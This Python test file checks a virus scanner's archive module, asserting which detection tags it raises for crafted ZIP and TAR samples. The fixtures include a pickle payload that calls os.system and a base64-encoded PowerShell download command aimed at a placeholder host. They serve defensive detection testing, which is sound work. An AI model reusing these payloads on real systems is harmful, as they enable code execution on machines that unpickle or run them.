from pathlib import Path
import base64
import tarfile
import zipfile

from Virus_Scan.scanners import archives
from Virus_Scan.scanners.ci.archive_boundary_audit import run_archive_boundary_audit


def test_zip_member_embedded_pickle_exec_evidence_is_preserved(tmp_path: Path):
    sample = tmp_path / "pickle_payload.zip"
    malicious_pickle = b'cos\nsystem\n(S"calc"\ntR.'
    with zipfile.ZipFile(sample, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("payload.pkl", malicious_pickle)
    tags, suspicious = archives.scan_archive_file(str(sample))
    assert suspicious
    assert "zip_archive" in tags
    assert "archive_member_pickle_payload" in tags
    assert "pickle_dangerous_global" in tags
    assert "pickle_reduce_opcode" in tags
    assert any(str(tag).startswith("archive_inner:pickle_dangerous_global") for tag in tags)


def test_tar_member_base64_payload_chain_evidence_is_preserved(tmp_path: Path):
    member = tmp_path / "encoded.txt"
    member.write_text(base64.b64encode(b"powershell Invoke-WebRequest http://example.invalid/a").decode("ascii"))
    sample = tmp_path / "payload_chain.tar"
    with tarfile.open(sample, "w") as archive:
        archive.add(member, arcname="encoded.txt")
    tags, suspicious = archives.scan_archive_file(str(sample))
    assert suspicious
    assert "tar_archive" in tags
    assert "archive_member_decoded_payload_observed" in tags
    assert "payload_decode_confirmed" in tags
    assert "decoded_base64_download_execute_chain" not in tags
    assert "network_activity" in tags
    assert any(str(tag).startswith("archive_inner:archive_member_decoded_payload_observed") for tag in tags)


def test_zip_member_decoded_binary_payload_evidence_is_preserved(tmp_path: Path):
    sample = tmp_path / "decoded_binary.zip"
    encoded = base64.b64encode(b"MZ" + b"\x00" * 64).decode("ascii")
    with zipfile.ZipFile(sample, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("encoded.txt", encoded)
    tags, suspicious = archives.scan_archive_file(str(sample))
    assert suspicious
    assert "zip_archive" in tags
    assert "archive_member_decoded_payload_observed" in tags
    assert "decoded_binary_payload" in tags
    assert "decoded_pe_payload" in tags


def test_unknown_archive_extension_emits_malformed_container_evidence(tmp_path: Path):
    sample = tmp_path / "not_really.rar"
    sample.write_bytes(b"not a supported archive")
    tags, suspicious = archives.scan_archive_file(str(sample))
    assert suspicious
    assert "unknown_archive" in tags
    assert "malformed_container" in tags
    assert "malformed_rar_container" in tags
    assert "failure_domain_extraction" in tags


def test_phase9_archive_boundary_audit_tracks_payload_boundary_module():
    result = run_archive_boundary_audit(Path("."))
    assert result.ok, result.to_record()
    assert result.files_scanned >= 12
